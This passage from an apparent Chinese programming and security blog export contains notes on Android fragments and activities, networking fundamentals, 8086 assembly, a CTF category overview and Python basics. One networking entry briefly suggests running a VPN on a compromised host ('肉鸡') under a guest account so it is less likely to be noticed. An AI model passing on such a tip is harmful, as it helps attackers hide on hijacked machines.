再次总结这一段代码首先，使用R.id.fragment_container的容器视图资源ID，向FragmentManager请求并获取fragment。如果要获取的fragment已存在于队列中，FragmentManager就直接返回它。 CrimeActivity目前托管着CrimeFragment。运行CriminalIntent应用验证这一点，应该可以看到定义在fragment_crime.xml中的视图，如图所示:本章的操作为后面的开发打下了坚实的基础，虽然现在看上去还是只有这一个可怜的界面，但是表桑心，好戏才刚刚开始呢。 FragmentManager 与 fragment 生命周期现在重新审视fragment的生命周期activity的FragmentManager负责调用队列中fragment的生命周期方法。添加fragment供FragmentManager管理时，onAttach(Activity)、onCreate(Bundle)以及onCreateView(...)方法会被调用。托管activity的onCreate(...)方法执行后，onActivityCreated(...)方法也会被调用。因为我们正在CrimeActivity.onCreate(...)方法中添加CrimeFragment，所以fragment被添加后，该方法会被调用。在activity处于运行状态时，添加fragment会发生什么呢？此种情况下，FragmentManager立即驱使fragment行动，执行必要方法，快速跟上activity的步伐（与activity的最新状态保持同步）。一旦fragment的状态与activity的状态保持了同步，托管activity的FragmentManager就会边接收操作系统的调用指令，边调用其他生命周期方法，以继续保持fragment与activity的状态一致。 使用 fragment 的理由 这是实际开发中最可能使用的模式 后期开发会经常使用到 为什么应优先使用支持库版 fragment没有使用Android操作系统内置版fragment，而是使用了支持库版fragment。 大多数开发人员都在使用支持fragment的Android版本 使用支持库版fragment没有显著的缺点]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>国光</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络基础知识]]></title>
    <url>%2F2017%2F10%2Fnetwork1.html</url>
    <content type="text"><![CDATA[IDLER的8086汇编学习笔记 寄存器 存储单元 地址总线 控制总线 数据总线 网络基础知识 会话层使用netstat -nb查看木马程序。这个命令是查看端口的，有时候不一定可以看到木马程序。 传输协议TCP先建立链接在传输数据，数据包不需要携带目的地址，保证传输数据的可靠性。可靠传输，流量控制。 UDP不需要建立连接，直接发数据，每个报文都有完整的目的地址，但是不可靠，例如看视频时有一小片段没出现，就是使用了UDP传输的。也就是不可靠传输。qq聊天内容一个数据包即可发送。 网络层如何规划 数据链路层帧的开始和结束的选择，查看校验，属于透明传输 物理层物理设备。路由器，交换机。接口标准。 OSI七层模型。 本地封装过程 数据链路层数据链路层将网络层发送来的tcp数据和ip地址封装成具有头和尾还有校验值的数据帧，（头和尾还有校验值负责在数据链路层进行传输，如果值不正确，那么接收方就不会接受当数据帧的ip数据包中出现头和尾时，会使用一个esc 转义字符。就会让接受端可以识别头和尾。然后看图就懂了。 MAC地址和DNS作用当客户端输入一个网址时，会去往该客户端所设定的DNS服务器解析出ip地址，此时开始发送数据包，路线中有很多路由器，每到一个节点，mac地址都会进行修改，dns解析的ip地址告诉终点是那个服务器，mac地址每到一个路由器，都会将mac地址进行修改，将源mac地址改为该路由器mac地址，在将目标mac地址改为下一个路由器的mac地址。到达目标服务器时，服务器发送网页数据，在网慢的时候会发现，网页时一部分一部分出现的，是数据太大，最大（1500个字节）分开传输，一部分一部分请求传输。 使用osi排查网络错误物理层查看接收的和发送的数据包，如果没有接收包，说明网线有问题。数据链路层 1.mac地址冲突 2.adsl欠费，数据链路层断开导致网路层断开。 3。客户机网速100兆和交换网速设定的不可改变的1000兆不相符，导致。网络层配置错误的ip地址（网段不同）、子网掩码、配置错误的网关（没有出口）路由器没有配置到达目标ip的去由。应用层、会话层、表示层故障应用程序配置错误，例如 ie使用不存在的代理，不能打开网址。 深度理解TCP/IP 和OSI原型 计算机网络性能带宽12IEEE 802.3 有线的局域网IEEE 802.11 vpn和代理服务器浅谈vpn自己在上网时，使用另外一台电脑作为跳板访问网络，且隐藏自己的实际ip。可以在windows server 2003 种设置一个vpn服务器，在使用xp系统链接该服务器达到使用vpn的作用，在设置vpn服务器时，可以将权限设置给权限很低的访客用户组。这样在肉鸡(这种敏感词少用比较好)上不易发现？ 代理服务器跟VPN有同样的功能，访问网站时，使用代理服务器的ip，同样隐藏了自己的ip。ccproxy是一款可以将一台电脑设置为代理服务器的简单方便软件。下载好后，在虚拟机中使用另外一台设备将其ip设为代理服务器，便可以达到该效果。 具体内容在日后用到时，将会做详细补充。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>Heathen</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8086寄存器CPU工作原理02]]></title>
    <url>%2F2017%2F10%2F80862.html</url>
    <content type="text"><![CDATA[IDLER的8086汇编学习笔记 寄存器 字 几条汇编指令读程序题 物理寻址的方法 寄存器8086 CPU有14个寄存器：1AX BX CX DX DI SP BP IP CS SS DS ES PSW 8086 CPU所有的寄存器都是16位的，可以存放两个字节。1AX BX CX DX 通常用来存放一般性数据被称为通用寄存器。 AX的低8位（0位~7位）构成了AL寄存器，高8位（8位~15位）构成了AH寄存器。 AH和AL寄存器可以独立使用的8位寄存器。 字12word = 2B B = 8b 一个字16位 Bin 二进制 几条汇编指令 汇编指令不区分大小写！！ 特别注意 AL和AX的区别 检测点 没有通过检测点请不要向下学习！只能使用目前学过的汇编指令，最多使用四条指令，编程计算2的4次方。 我的思路：222*2=2+2+4+8123456原AX的值：0000H 运行的值↓ mov ax,0002H ax=2 add ax,ax ax=ax+ax=4 add ax,ax ax=ax+ax=8 add ax,ax ax=ax+ax=16 16位结构的CPU概括的讲，16位结构描述了一个CPU具有以下特征： 01.运算一次最多可以处理16位的数据。 02.寄存器的最大宽度为16位。 03.寄存器和运算器之间的通路是16位的。 8086CPU给出物理地址的方法8086 外部 有 20 位地址总线，可传送 20 位地址，寻址能力为1M。8086 内部 为 16 位结构，他只能传送 16 位的地址表现出的寻址能力却只有64K。 8086 CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址如图：公式 地址加法器合成物理地址的方法：1物理地址 = 段地址 * 16 + 偏移地址]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>IDLER</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8086寄存器CPU工作原理01]]></title>
    <url>%2F2017%2F10%2F80861.html</url>
    <content type="text"><![CDATA[IDLER的8086汇编学习笔记 寄存器 存储单元 地址总线 控制总线 数据总线 操作：寄存器 BX的内容送到AX中12机器指令：1000100111011000 汇编指令：mov ax,bx 寄存器是CPU中可以存储数据的器件，一个CPU中可以有多个寄存器 工作过程 汇编语言的组成： 1.汇编指令（机器码的助记符） 2.伪指令 （由编译器执行） 3.其他符号（由编译器识别） 汇编语言的核心是汇编指令，它决定了汇编语言的特性。 存储单元存储器被划分为若干个存储单元，每个存储单元从0开始顺序编号，如下图： 存储单位：123451 byte = 8 bit 1 KB = 1024 B 1 MB = 1024 KB 1 GB = 1024 MB 1 TB = 1024 GB CPU对存储单元的读写CPU想要进行数据的读写，必须和外部器件（标准说法是芯片）进行三类信息的交互。 1.存储单元的地址（地址信息）/地址总线 2.器件的选择，读或写命令（控制信息）/控制总线 3.读或写的数据（数据信息）/数据总线 地址总线CPU是通过地址总线来指定存储单元的。地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。 一个CPU有n根地址总线，则可以说这个CPU的地址总线的宽度为n。这样的CPU最多可以寻找2的n次方个内存单元。 数据总线CPU与内存或其他器件之间的数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。 写入数据89D8时8088CPU数据总线的数据传送情况：8086CPU数据总线的数据传输情况： 控制总线控制总线是一些不同控制总线的集合。有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU对外部器件的控制能力。]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>IDLER</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF新手指南]]></title>
    <url>%2F2017%2F09%2FCTFinfo.html</url>
    <content type="text"><![CDATA[Knowing is not enough; we must apply. Willing is not enough; we must do. CTF新手指南12“Knowing is not enough; we must apply. Willing is not enough; we must do.” （仅仅知道还不够，我们必须付诸实践。仅有意愿还不够，我们必须付诸行动。）—— Johann Wolfgang von Goethe CTF（夺旗赛）介绍CTF(Capture The Flag)中文一般译为夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大赛，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 CTF（比赛）WEB1涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行、上传等漏洞. Crypto1即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，主要考查参赛选手密码学相关知识点. MISC1即安全杂项，题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广，主要考查参赛选手的各种基础综合知识. Reverse1即逆向工程，题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。主要考查参赛选手的逆向分析能力. STEGA1即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度. PPC1即编程类题目，题目涉及到程序编写、编程算法实现，当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python或Ruby来尝试 PWN1在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。主要考察参数选手对漏洞的利用能力. 以上总结来源于实验吧]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>sky</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python模块学习之random]]></title>
    <url>%2F2017%2F09%2Fpyrandom.html</url>
    <content type="text"><![CDATA[记录了Python的random的一些知识点，尝试着用Python写猜拳小游戏脚本 简介random是用于生成随机数的，我们可以利用它随机生成数字或者选择字符串。 random.random()用于生成一个随机浮点数：range[0.0,1.0)1234# -*- coding:utf-8 -*-import randoma = random.random()print(a) 运行结果10.487110087493 random.uniform(a,b)用于生成一个指定范围内的随机浮点数，a,b为上下限，a!=b,就会生成介于两者之间的一个浮点数a=b，则生成的浮点数就是a12345678# -*- coding:utf-8 -*-import randoma = random.uniform(10,20)b = random.uniform(20,10) c = random.uniform(10,10)print (a)print (b)print (c) 运行结果12313.115538933911.168353203410.0 random.randint(a,b)用于生成一个指定范围内的整数，a为下限，b为上限，生成的随机整数a&lt;=n&lt;=b;若a=b，则n=a若a&gt;b，报错1234import randomrandom.randint(10,20) #输出 12random.randint(10,10) #输出 10random.randint(20,10) #Error random.randrange(x, y, step)从指定范围内，按指定基数递增的集合中获取一个随机数，基数缺省值为11234import randomrandom.randrange(10,100) #输出为10到100间的任意数random.randrange(10,100,4) #输出为10到100内以4递增的序列[10,14,18,22...]random.choice(range(10,100,4)) #输出在结果上与上一条等效 random.choice(sequence)从序列中获取一个随机元素，参数sequence表示一个有序类型，并不是一种特定类型，泛指list，tuple，字符串等123456789import randomrandom.choice(range(10)) #输出0到10内随机整数random.choice(range(10,100,2)) #输出随机值[10,12,14,16...]random.choice("I love python") #输出随机字符I,o,v,p,y...random.choice(("I love python")) #同上random.choice(["I love python"]) #输出“I love python”random.choice("I","love","python") #Errorrandom.choice(("I","love","python")) #输出随机字符串“I”，“love”，“python”random.choice(["I","love","python"]) #输出随机字符串“I”，“love”，“python” random.shuffle(x[,random])用于将一个列表中的元素打乱1234import randomlist=['I','love','python','very','much']random.shuffle(list)print list #输出乱序list random.sample(sequence,k)从指定序列中随机获取k个元素作为一个片段返回，`sample函数不会修改原有序列12345678910# -*- coding:utf-8 -*-import randoma='123456789'b=[1,2,3,4,5,6,7,8,9]c=['a','b','c','d','e']aa = random.sample(a,3)bb = random.sample(b,3)cc = random.sample(c,3)print(aa)print(bb) 运行结果123[&apos;9&apos;, &apos;2&apos;, &apos;5&apos;][5, 9, 3][&apos;c&apos;, &apos;e&apos;, &apos;a&apos;] 猜拳游戏的实际运用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# -*- coding:utf-8 -*-import randomwhile(1): print ("欢迎进入国光的石头剪刀布小游戏") print (" _ooOoo_ " ) print (" o8888888o " ) print (" 88 . 88 " ) print (" (| -_- |) " ) print (" O\\ = /O " ) print (" ____/`---'\\____ " ) print (" . ' \\| |// `. " ) print (" / \\||| : |||// \\ " ) print (" / _||||| -:- |||||- \\ " ) print (" | | \\\\\\ - /// | | " ) print (" | \\_| ''\\---/'' | | " ) print (" \\ .-\\__ `-` ___/-. / " ) print (" ___`. .' /--.--\\ `. . __ " ) print (" ."" '&lt; `.___\\_&lt;|&gt;_/___.' &gt;'"". " ) print (" | | : `- \\`.;`\\ _ /`;.`/ - ` : | | " ) print (" \\ \\ `-. \\_ __\\ /__ _/ .-` / / " ) print (" ======`-.____`-.___\\_____/___.-`____.-'====== ") print (" `=---=' " ) print (" ") print (" ............................................. " ) player = (int)(input("选项:\n0-剪刀 1-石头 2-布\n请输入:")) pc = random.randint(0,2) def list(x): if(x == 0): return ("剪刀") elif(x == 1): return ("石头") else: return ("布") def gg(): print ("电脑:%s" % list(pc)) print ("你:%s" % list(player)) if ((player == 0) and ((pc == 1)) or (player == 1) and (pc == 2) or (player == 2) and (pc == 0) ): gg() print("好可惜 输给了电脑了") elif player == pc: gg() print("平局") else: gg() print ("恭喜 你赢了") flag = raw_input("想再继续玩一把吗？[Y/N]") print(flag) if(flag == 'N' or flag =='n'): print ("Bye Bye ~") break 运行结果12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061欢迎进入国光的石头剪刀布小游戏 _ooOoo_ o8888888o 88 . 88 (| -_- |) O\ = /O ____/`---&apos;\____ . &apos; \| |// `. / \||| : |||// \ / _||||| -:- |||||- \ | | \\\ - /// | | | \_| &apos;&apos;\---/&apos;&apos; | | \ .-\__ `-` ___/-. / ___`. .&apos; /--.--\ `. . __ . &apos;&lt; `.___\_&lt;|&gt;_/___.&apos; &gt;&apos;. | | : `- \`.;`\ _ /`;.`/ - ` : | | \ \ `-. \_ __\ /__ _/ .-` / / ======`-.____`-.___\_____/___.-`____.-&apos;====== `=---=&apos; ............................................. 选项:0-剪刀 1-石头 2-布请输入:2电脑:剪刀你:布好可惜 输给了电脑了想再继续玩一把吗？[Y/N]yy欢迎进入国光的石头剪刀布小游戏 _ooOoo_ o8888888o 88 . 88 (| -_- |) O\ = /O ____/`---&apos;\____ . &apos; \| |// `. / \||| : |||// \ / _||||| -:- |||||- \ | | \\\ - /// | | | \_| &apos;&apos;\---/&apos;&apos; | | \ .-\__ `-` ___/-. / ___`. .&apos; /--.--\ `. . __ . &apos;&lt; `.___\_&lt;|&gt;_/___.&apos; &gt;&apos;. | | : `- \`.;`\ _ /`;.`/ - ` : | | \ \ `-. \_ __\ /__ _/ .-` / / ======`-.____`-.___\_____/___.-`____.-&apos;====== `=---=&apos; ............................................. 选项:0-剪刀 1-石头 2-布请输入:0电脑:剪刀你:剪刀平局想再继续玩一把吗？[Y/N]nnBye Bye ~Process finished with exit code 0 自我总结程序一直循环核心代码1234567while(1):******代码主体******flag = raw_input("想再继续玩一把吗？[Y/N]") print(flag) if(flag == 'N' or flag =='n'): print ("Bye Bye ~") break 结果显示核心代码123456789101112131415161718192021def list(x): if(x == 0): return ("剪刀") elif(x == 1): return ("石头") else: return ("布")def gg(): print ("电脑:%s" % list(pc)) print ("你:%s" % list(player))if ((player == 0) and ((pc == 1)) or (player == 1) and (pc == 2) or (player == 2) and (pc == 0) ): gg() print("好可惜 输给了电脑了")elif player == pc: gg() print("平局")else: gg() print ("恭喜 你赢了") 首先封装了一个list()函数用于显示 结果详情，为了减少操作，又把冗余信息封装在了一个gg()函数里面 这样使用的时候直接调用即可。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android学习之 fragment]]></title>
    <url>%2F2017%2F09%2Fandroid4.html</url>
    <content type="text"><![CDATA[fragment来是管理用户界面的，是现在安卓开发中主流的技术，所以从一开始就应该去尝试使用fragment fragment简介fragment是一种控制器对象,activity可委派它完成一些任务。这些任务通常就是管理用户界面。受管的用户界面可以是一整屏或是整屏的一部分。管理用户界面的fragment又称为UI fragment。它自己也有产生于布局文件的视图。fragment视图包含了用户可以交互的可视化UI元素。activity视图可预留供fragment视图插入的位置。如果有多个fragment要插入,activity视图也可提供多个位置。 Gradle 更新依赖在app中添加新的依赖项，然后build.gradle文件会自动更新文件，如下:12345678dependencies &#123; compile fileTree(include: ['*.jar'], dir: 'libs') androidTestCompile('com.android.support.test.espresso:espresso-core:2.2.2', &#123; exclude group: 'com.android.support', module: 'support-annotations' &#125;) compile 'com.android.support:appcompat-v7:25.3.0' testCompile 'junit:junit:4.12'&#125; 删除模板代码创建新的Crime类将 CrimeActivity 的超类更改为 FragmentActivity ,同时删除由模板生成的 onCreateOptionsMenu(Menu) 和 onOptionsItemSelected(MenuItem) 实现代码CrimeActivity.java1234567public class CrimeActivity extends AppCompatActivity FragmentActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_crime); &#125;&#125; 创建新的Crime类Crime.java12345678public class Crime &#123; private UUID mId; private String mTitle; public Crime() &#123; // Generate unique identifier mId = UUID.randomUUID(); &#125;&#125; 为只读成员变量 mId 生成一个获取方法,为成员变量 mTitle 生成获取方法和设置方法Crime.java12345678910111213141516public class Crime &#123; private UUID mId; private String mTitle; public Crime() &#123; mId = UUID.randomUUID(); &#125; public UUID getId() &#123; return mId; &#125; public String getTitle() &#123; return mTitle; &#125; public void setTitle(String title) &#123; mTitle = title; &#125;&#125; 替换默认布局文件FrameLayout 是服务于 CrimeFragment 的容器视图，下面使用FrameLayout代码来 替换 默认布局activity_crime.xml12345&lt;FrameLayout xmlns:android="http://schemas.android.com/apk/res/android" android:id="@+id/fragment_container" android:layout_width="match_parent" android:layout_height="match_parent"/&gt; 定义 CrimeFragment 的布局fragment_crime.xml12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:layout_margin="16dp" android:orientation="vertical"&gt; &lt;TextView style="?android:listSeparatorTextViewStyle" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="@string/crime_title_label"/&gt; &lt;EditText android:id="@+id/crime_title" android:layout_width="match_parent" android:layout_height="wrap_content" android:hint="@string/crime_title_hint"/&gt; &lt;TextView style="?android:listSeparatorTextViewStyle" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="@string/crime_details_label"/&gt; &lt;Button android:id="@+id/crime_date" android:layout_width="match_parent" android:layout_height="wrap_content"/&gt; &lt;CheckBox android:id="@+id/crime_solved" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="@string/crime_solved_label"/&gt;&lt;/LinearLayout&gt; 完善 strings.xml 文件因为fragment_crime.xml文件中@引入了新的id组件，所以得在strings.xml文件中 完善相关字符串的资源定义strings.xml1234567&lt;resources&gt; &lt;string name="app_name"&gt;CriminalIntent&lt;/string&gt; &lt;string name="crime_title_hint"&gt;Enter a title for the crime.&lt;/string&gt; &lt;string name="crime_title_label"&gt;Title&lt;/string&gt; &lt;string name="crime_details_label"&gt;Details&lt;/string&gt; &lt;string name="crime_solved_label"&gt;Solved&lt;/string&gt;&lt;/resources&gt; 创建 CrimeFragment 类CrimeFragment类继承Fragment类，新增一个 Crime 实例成员变量,实现 Fragment.onCreate(Bundle)方法，在CrimeFragment.java中,添加 onCreateView(...)方法的实现代码,从fragment_crime.xml布局中实例化并返回视图CrimeFragment.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.bignerdranch.android.criminalintent;import android.os.Bundle;import android.support.v4.app.Fragment;import android.text.Editable;import android.text.TextWatcher;import android.view.LayoutInflater;import android.view.View;import android.view.ViewGroup;import android.widget.Button;import android.widget.CheckBox;import android.widget.CompoundButton;import android.widget.EditText;import static android.widget.CompoundButton.*;public class CrimeFragment extends Fragment &#123; private Crime mCrime; private EditText mTitleField; private Button mDateButton; private CheckBox mSolvedCheckbox; @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); mCrime = new Crime(); &#125; @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123; View v = inflater.inflate(R.layout.fragment_crime, container, false); mTitleField = (EditText) v.findViewById(R.id.crime_title); mTitleField.addTextChangedListener(new TextWatcher() &#123; @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) &#123; &#125; @Override public void onTextChanged(CharSequence s, int start, int before, int count) &#123; mCrime.setTitle(s.toString()); &#125; @Override public void afterTextChanged(Editable s) &#123; &#125; &#125;); mDateButton = (Button) v.findViewById(R.id.crime_date); mDateButton.setText(mCrime.getDate().toString()); mDateButton.setEnabled(false); mSolvedCheckbox = (CheckBox) v.findViewById(R.id.crime_solved); mSolvedCheckbox.setOnCheckedChangeListener(new OnCheckedChangeListener() &#123; @Override public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) &#123; mCrime.setSolved(isChecked); &#125; &#125;); return v; &#125;&#125; 视图生成后,引用EditText 组件并添加对应的监听器方法。CrimeFragment.java123456789101112131415161718192021222324252627public class CrimeFragment extends Fragment &#123; private Crime mCrime; private EditText mTitleField; ... @Override public View onCreateView(LayoutInflater inflater, ViewGroup container,Bundle savedInstanceState) &#123; View v = inflater.inflate(R.layout.fragment_crime, container, false); mTitleField = (EditText)v.findViewById(R.id.crime_title); mTitleField.addTextChangedListener(new TextWatcher() &#123; @Override public void beforeTextChanged( CharSequence s, int start, int count, int after) &#123; &#125; @Override public void onTextChanged( CharSequence s, int start, int before, int count) &#123; mCrime.setTitle(s.toString()); &#125; @Override public void afterTextChanged(Editable s) &#123; &#125;&#125;); return v;&#125;&#125; Fragment.onCreateView(...) 方法中的组件引用几乎等同于 Activity.onCreate(...)方法的处理。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>国光</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python代码扫盲]]></title>
    <url>%2F2017%2F09%2Fpystart.html</url>
    <content type="text"><![CDATA[最近再看别人用Python写的解密脚本，顺便带着记录学习一下吧。 Python头部标注#!/usr/bin/env python为了防止操作系统用户没有将python装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作。 #!/usr/bin/ python告诉操作系统执行这个脚本的时候，调用/usr/bin下的python解释器 总结#!/usr/bin/ python相当于写死了python路径;#!/usr/bin/env python会去环境设置寻找python目录,推荐这种写法 编码用来指定文件编码为utf-81234567# coding=utf-8 # coding:utf-8# --coding:utf-8--# -*- coding:utf-8 -*- 推荐使用# -*- coding:utf-8 -*-]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第二个Activity]]></title>
    <url>%2F2017%2F09%2Fandroid3.html</url>
    <content type="text"><![CDATA[记录了不同的activity的数据传递以及界面的切换 app需求为GeoQuiz应用增加第二个activity。activity控制着当前屏幕界面，新增加的activity将增加第二个用户界面，方便用户查看当前问题的答案，如图所示: 思路 创建新的activity及配套布局 从一个activity中启动另一个activity 在父activity（启动方）与子activity（被启动方）间传递数据 创建第二个 activity完善 strings.xml12345&lt;string name="prev_button"&gt;上一题&lt;/string&gt; &lt;string name="warning_text"&gt;你真的要这么做吗？&lt;/string&gt; &lt;string name="show_answer_button"&gt;偷看问题答案&lt;/string&gt; &lt;string name="judgement_toast"&gt;偷看答案不是好孩子&lt;/string&gt; &lt;string name="cheat_button"&gt;偷看&lt;/string&gt; 创建 CheatActivity 类新建activity向导完成后，Android Studio应该已经打开了layout目录中的activity_cheat.xml。 activity_cheat.xml下面是activity_cheat.xml的布局配置文件,2个Textview和一个Buton1234567891011121314151617181920212223242526272829&lt;LinearLayout android:layout_width="368dp" android:layout_height="495dp" android:gravity="center" android:orientation="vertical" tools:layout_editor_absoluteX="8dp" tools:layout_editor_absoluteY="-96dp"&gt; &lt;TextView android:id="@+id/textView" android:layout_width="wrap_content" android:layout_height="wrap_content" android:padding="24dp" android:text="@string/warning_text"/&gt; &lt;TextView android:id="@+id/answer_text_view" android:layout_width="wrap_content" android:layout_height="wrap_content" android:padding="24dp" tools:text="Answer"/&gt; &lt;Button android:id="@+id/show_answer_button" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="@string/show_answer_button" /&gt; &lt;/LinearLayout&gt; 这里第二个TextView这里使用了:1android:id="@+id/answer_text_view" 这个命名空间方便显示了 对 或者 错效果预览 AndroidManifest.xml创建QuizActivity时，因使用了新建应用向导，向导已自动完成声明工作。同样，新建activity向导也自动声明了CheatActivity12&lt;activity android:name=".CheatActivity"&gt; &lt;/activity&gt; 这个时候manifest配置应该自动完成了文件中的CheatActivity声明。可以看到在这个mainfest的配置文件中包含了2个activity，其中默认启动的Activity的是:QuizActivity 主页面添加 偷看 按钮完善 activity_quiz.xml文件123456&lt;Button android:id="@+id/cheat_button" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_gravity="bottom|center" android:text="@string/cheat_button" /&gt; 效果如下 启动第二个 activity添加 Cheat 偷看按钮的变量QuizActivity.java123456789private Button mCheatButton;mCheatButton = (Button)findViewById(R.id.cheat_button); mCheatButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; // Start CheatActivity &#125; &#125;); 这里创建了mCheatButton这个对象，并设置了一个空的监听事件 启动 activity调用请求发送给了操作系统的ActivityManager。ActivityManager负责创建Activity实例并调用其onCreate(...)方法。activity的启动示意图如图所示: 基于 intent 的通信intent对象是component用来与操作系统通信的一种媒介工具。intent是一种多用途通信工具。Intent类提供了多个构造方法，以满足不同的使用需求。1public Intent(Context packageContext, Class&lt;?&gt; cls) Class类型参数告诉ActivityManager应该启动哪个activity；Context参数告诉ActivityManager在哪里可以找到它，如图所示:可以看出ActivityManager该启动哪个Activity是由startActivity(...)这个方法中的Intent这个参数来决定的，这个演示图片里面这里Intent参数 告诉了ActivityManager该启动CheatActivity这个界面了。 设置 mCheatButton 监听器创建包含CheatActivity类的Intent实例，然后将其传入startActivity(Intent)方法QuizActivity.java12345678mCheatButton = (Button) findViewById(R.id.cheat_button); mCheatButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent i = new Intent(QuizActivity.this, CheatActivity.class); startActivity(i); &#125; &#125;); 在启动activity前，ActivityManager会检查确认指定的Class是否已在配置文件中声明。如已完成声明，则启动activity，应用正常运行。反之，则抛出ActivityNotFoundException异常，可能会导致应用崩溃。 activity 间的数据传递现在已经有了2个Activity了现在看下他们之间的关系图:接下来考虑如何处理主页面跳转到偷看答案的页面之间传递的数据:CheatActivity启动后，QuizActivity会通知它当前问题的答案。用户知道答案后，单击后退键回到QuizActivity，CheatActivity随即会被销毁。在销毁前的瞬间，它会将用户是否作弊的数据传递给QuizActivity。 使用 intent extra为通知CheatActivity当前问题的答案，需将以下语句的返回值传递给它：1mQuestionBank[mCurrentIndex].isAnswerTrue() 该值将作为extra信息，附加在传入startActivity(Intent)方法的Intent上发送出去。extra信息可以是任意数据，它包含在Intent中，由启动方activity发送出去。在CheatActivity.java中，为extra数据信息新增键值对中的键CheatActivity.java12345public class CheatActivity extends AppCompatActivity &#123; private static final String EXTRA_ANSWER_IS_TRUE = "com.sqlsec.gg.geoquiz.answer_is_true";&#125; CheatActivity处理extra信息,而在newIntent(...)方法中封装这些逻辑CheatActivity.java12345public static Intent newIntent(Context packageContext, boolean answerIsTrue) &#123; Intent i = new Intent(packageContext, CheatActivity.class); intent.putExtra(EXTRA_ANSWER_IS_TRUE, answerIsTrue); return i;&#125; boolean类型的answerIsTrue以及EXTRA_ANSWER_IS_TRUE常量 放入intent供解析,简化了操作。 用一个extra启动QuizActivity.java12345678910mCheatButton = (Button) findViewById(R.id.cheat_button); mCheatButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; boolean answerIsTrue = mQuestionBank[mCurrentIndex].isAnswerTrue(); Intent i = CheatActivity.newIntent(QuizActivity.this, answerIsTrue); startActivity(i); &#125; &#125;); updateQuestion(); 这里面如果要添加多个extra的话，就在newIntent()方法中添加多个参数。要从extra获取数据，会用到下面的方法:1public boolean getBooleanExtra(String name, boolean defaultValue) 第一个参数是extra的名字。getBooleanExtra(…)方法的第二个参数是指定默认值（默认答案），它在无法获得有效键值时使用。 获取 extra 信息下面是编码实现从extra获取信息，存入成员变量。CheatActivity.java12345678910111213public class CheatActivity extends AppCompatActivity &#123; private static final String EXTRA_ANSWER_IS_TRUE = "com.sqlsec.gg.geoquiz.answer_is_true"; private boolean mAnswerIsTrue; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_cheat); mAnswerIsTrue = getIntent().getBooleanExtra(EXTRA_ANSWER_IS_TRUE, false); &#125;&#125; 启用作弊模式在CheatActivity.java代码中，单击SHOW ANSWER按钮后获取到答案并将这个结果显示在TextView上面。CheatActivity.java1234567891011121314151617181920private TextView mAnswerTextView;private Button mShowAnswer;protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_cheat); mAnswerIsTrue = getIntent().getBooleanExtra(EXTRA_ANSWER_IS_TRUE, false); mAnswerTextView = (TextView) findViewById(R.id.answer_text_view); mShowAnswerButton = (Button) findViewById(R.id.show_answer_button); mShowAnswerButton.setOnClickListener(new 